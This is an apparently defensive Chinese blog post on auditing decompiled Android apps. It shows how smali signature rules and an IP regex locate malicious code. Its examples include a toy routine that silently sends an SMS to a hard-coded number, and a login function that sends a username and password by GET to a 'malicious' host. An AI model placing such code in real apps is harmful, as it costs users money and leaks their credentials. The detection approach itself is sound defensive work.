---
title: Android白盒审计之代码定位
---
标签（空格分隔）： AndroidSec

---

## 0x01 漏洞/恶意代码 规则提取
通常 **安全测试人员/反病毒工程师** 拿到的是**apk包而非Java代码**，这个时候就需要经过**反编译dex拿到smali代码**进行定位，为了定位，这个时候我们就需要用**规则**。
### 1. smali代码规则
```
类似发送短信的恶意代码如下：
public void sendSMS(String phoneNumber,String message){
        //获取短信管理器
        android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
        smsManager.sendTextMessage("18935353211", null, "i am hacker", null, null);

}
```
最终发送短信的代码为**smsManager.sendTextMessage("18935353211", null, text, null, null)**，因为我们拿到的是apk，最终拿到的是smali代码，那么我们需要提取smali规则，这个时候我们就需要用到一款**Java2smali的AndroidStudio插件**，直接将**Java代码转化为smali代码**，类似上段恶意代码的smali代码如下：
```
.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .registers 9
    .param p1, "phoneNumber"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 30
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 31
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    const-string v1, "18935353211"

    const-string v3, "i am hacker"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 33
    return-void
.end method

```
这个时候可以轻而易举的提取到发送短信的规则

```
**Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V**
```
然后根据这个规则就能定位到这行恶意代码为24行，同时根据47行的恶意代码就能拿到存放手机号和恶意短信的**寄存器**，类似这个存放手机号和短信的寄存器分别是**v1和v3**，然后利用寄存器构建后置规则，**const-string v1** 和 **const-string v3**,然后用后置规则向上回溯，精确定位到18(**const-string v1, "18935353211"**)和16行(**const-string v3, "i am hacker"**),这个时候就可以拿到恶意短信信息和手机号，然后可以通过这个smali文件定位到类名，最后拿到恶意代码类、恶意代码行和恶意代码，同理，可以根据这个扫描漏洞（只需替换为漏洞规则,并设置权重，最后计算权重），这对甲方进行安全风险评估很重要。

>详细情况如图：

![代码定位](https://i.screenshot.net/q5dqwad)
### 2. 正则规则
```
类似我们要定位出恶意的URL("http://172.16.168.111:1010/login.php")，如下代码：
public static String loginByGet(String username,String password){
        //get的方式提交就是url拼接的方式
        String path = "http://172.16.168.111:1010/login.php?username="+username+"&password="+password;
        try {
            URL url = new URL(path);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(5000);
            connection.setRequestMethod("GET");
            //获得结果码
            int responseCode = connection.getResponseCode();
            if(responseCode ==200){
                //请求成功 获得返回的流
                InputStream is = connection.getInputStream();
                return null;
            }else {
                //请求失败
                return null;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
}
```

```
上面代码的smali代码如下：
.method public static loginByGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .registers 11
    .param p0, "username"    # Ljava/lang/String;
    .param p1, "password"    # Ljava/lang/String;

    .prologue
    const/4 v8, 0x0

    .line 54
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://172.16.168.111:1010/login.php?username="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&password="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 56
    .local v3, "path":Ljava/lang/String;
    :try_start_1e
    new-instance v5, Ljava/net/URL;

    invoke-direct {v5, v3}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 57
    .local v5, "url":Ljava/net/URL;
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

   =============================省略无用的=====================================
.end method
```

打开url的代码是: **URL url = new URL(path)**,即最终的smali规则会是**Ljava/net/URL;-><init>(Ljava/lang/String;)V**，这个时候你可以拿到存放url的寄存器为**v3**，代码行数是**40**行，但是因为url是经过拼接的，这个时候寄存器定位会出现问题，so，我们需要**正则表达式**定位，我们的目标是**http://172.16.168.111:1010/login.php**，那么写出这个正则表达式如下，定位出**172.16.168.111**这个ip，然后就跟可以定位出恶意url，这是另外一种定位方式，在Android自动化审计中，常常用到。
```
(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])
```
逻辑图：
![此处输入图片的描述](https://i.screenshot.net/59x3ghm)
### 0x02 怎么提高审计效率
```
多线程技术，将dex反编译后添加到扫描线程池
```
逻辑图：
![提高审计效率](https://i.screenshot.net/8zj98ap)

### 0x03 规则提取时需要注意扫描后的误报率，即规则优化，后续

### 0x04 设置规则权重，进行安全评估，后续

